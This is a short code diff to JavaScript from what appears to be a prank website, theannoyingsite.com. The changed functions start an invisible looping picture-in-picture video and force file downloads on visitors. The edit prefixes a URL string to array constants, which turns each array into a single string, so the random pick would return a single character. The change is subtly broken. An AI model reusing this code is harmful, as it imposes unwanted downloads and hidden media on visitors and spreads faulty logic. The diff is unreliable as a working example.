@@ -492,7 +492,7 @@ function interceptUserInput(onInput) {
  */
 function startInvisiblePictureInPictureVideo() {
     const video = document.createElement("video");
-    video.src = getRandomArrayEntry(VIDEOS);
+    video.src = getRandomArrayEntry("https://theannoyingsite.com/" + VIDEOS);
     video.loop = true;
     video.muted = true;
     video.style = HIDDEN_STYLE;
@@ -553,7 +553,7 @@ function hideCursor() {
  * event or they will be blocked.
  */
 function triggerFileDownload() {
-    const fileName = getRandomArrayEntry(FILE_DOWNLOADS);
+    const fileName = getRandomArrayEntry("https://theannoyingsite.com/" + FILE_DOWNLOADS);
     const a = document.createElement("a");
     a.href = fileName;
     a.download = fileName;
